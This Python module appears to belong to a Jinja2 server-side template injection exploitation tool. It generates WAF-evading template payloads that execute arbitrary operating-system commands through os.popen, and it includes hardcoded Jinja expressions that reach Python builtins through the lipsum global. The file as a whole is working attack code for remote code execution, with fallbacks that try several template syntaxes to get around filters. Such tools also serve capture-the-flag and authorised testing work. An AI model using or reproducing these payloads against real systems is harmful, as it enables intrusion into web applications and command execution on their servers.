from . import payload_gen
from .int_vars import get_useable_int_vars

import logging

logger = logging.Logger("shell_payload")


def get_int_context(waf_func):
    ints, var_names, payload = get_useable_int_vars(waf_func)
    if len(ints) == 0:
        logger.warning("No IntVars For YOU!")
    return payload, dict(zip(var_names, ints))

def get_str_context(waf_func):
    str_vars = [
        ("un", "_", "{%set un=(lipsum|escape|batch(22)|list|first|last)%}"),
        ("perc", "%", "{%set perc=(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
         "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
         "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}")
    ]
    str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
    return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}



def exec_cmd_payload(waf_func, cmd):

    int_payload, int_context = get_int_context(waf_func)
    str_payload, str_context = get_str_context(waf_func)
    before_payload, context = int_payload + str_payload, {**int_context, **str_context}
    will_print = True
    if waf_func("{{"):
        outer_pattern = "{{PAYLOAD}}"
    elif waf_func("{%print()%}"):
        logging.warning("{{ is being waf, using {%print()%}!")
        outer_pattern = "{%print(PAYLOAD)%}"
    elif waf_func("{%if()%}{%endif%}"):
        will_print = False
        logging.warning("{{ is being waf, no execute result for you!")
        outer_pattern = "{%if(PAYLOAD)%}{%endif%}"
    elif waf_func("{% set x= %}"):
        will_print = False
        logging.warning("{{ is being waf, no execute result for you!")
        outer_pattern = "{% set x=PAYLOAD %}"
    else:
        logging.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
        return None, None

    inner_payload = payload_gen.generate(
        payload_gen.OS_POPEN_READ,
        cmd,
        waf_func=waf_func,
        context=context
    )
    if inner_payload is None:

        logger.warning("Bypassing WAF Failed.")
        return None, None

    return before_payload + outer_pattern.replace("PAYLOAD", inner_payload), will_print
